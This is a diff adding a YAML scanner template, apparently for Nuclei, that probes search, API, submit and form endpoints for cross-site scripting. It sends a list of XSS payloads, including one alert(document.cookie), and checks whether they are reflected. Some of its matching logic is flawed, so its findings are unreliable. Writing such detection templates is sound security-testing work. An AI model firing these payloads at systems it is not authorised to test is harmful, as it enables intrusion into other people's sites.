@@ -1,0 +1,82 @@
+id: xss-detection
+
+info:
+  name: Comprehensive XSS Detection Template
+  author: ProjectDiscoveryAI
+  severity: low
+  description: |
+    Detects potential XSS vulnerabilities by injecting payloads in query parameters and analyzing the response, while adapting payloads for diverse paths and content types.
+  tags: xss,fuzzing
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/search"
+      - "{{BaseURL}}/api/v1/query"
+      - "{{BaseURL}}/submit"
+    body: |
+      {
+        "query": "{{payload}}"
+      }
+    headers:
+      Content-Type: application/json
+    payloads:
+      payload:
+        - "<script>alert(1)</script>"
+        - "<img src=\"x\" onerror=alert(1)>"
+        - "\"><svg/onload=alert(1)>"
+        - "\"><script>alert(document.cookie)</script>"
+        - "<body onload=alert(1)>"
+        - "<iframe src=javascript:alert(1)></iframe>"
+        - "<marquee onstart=alert(1)>XSS</marquee>"
+        - "<math><mtext></mtext></math><script>alert(1)</script>"
+        - "<input autofocus onfocus=alert(1)>"
+        - "javascript:alert(1)"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "alert(1)"
+          - "<script>alert"
+          - "<svg/onload"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+          - "text/html"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/form"
+    body: |
+      "param1=value1&param2={{payload}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    payloads:
+      payload:
+        - "<script>alert(1)</script>"
+        - "<img src=\"x\" onerror=alert(1)>"
+        - "\"><svg/onload=alert(1)>"
+        - "\"><script>alert(document.cookie)</script>"
+        - "<body onload=alert(1)>"
+        - "<iframe src=javascript:alert(1)></iframe>"
+        - "<marquee onstart=alert(1)>XSS</marquee>"
+        - "<math><mtext></mtext></math><script>alert(1)</script>"
+        - "<input autofocus onfocus=alert(1)>"
+        - "javascript:alert(1)"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "alert(1)"
+          - "<script>alert"
+          - "<svg/onload"
+      - type: word
+        part: header
+        words:
+          - "application/x-www-form-urlencoded"
+          - "text/html"
